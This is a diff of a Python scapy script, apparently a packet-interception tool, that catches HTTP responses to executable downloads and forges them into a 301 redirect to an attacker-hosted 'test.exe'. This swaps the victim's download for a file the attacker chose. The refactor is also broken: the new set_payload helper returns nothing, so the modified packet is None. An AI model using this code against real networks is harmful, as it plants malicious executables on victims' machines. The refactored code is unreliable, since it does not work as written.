@@ -3,6 +3,13 @@ import scapy.all as scapy
 
 ack_list = []
 
+def set_payload(packet):
+    packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://localIP/test.exe\n\n"
+                
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
@@ -14,14 +21,10 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                 print("EXE Response")
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
-                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://localIP/test.exe\n\n"
                 
-                del scapy_packet[scapy.IP].len
-                del scapy_packet[scapy.IP].chksum
-                del scapy_packet[scapy.TCP].chksum
+                modified_packet =  set_payload(scapy_packet)
 
-
-                packet.set_payload(bytes(scapy_packet))
+                packet.set_payload(bytes(modified_packet))
 
     packet.accept()
 
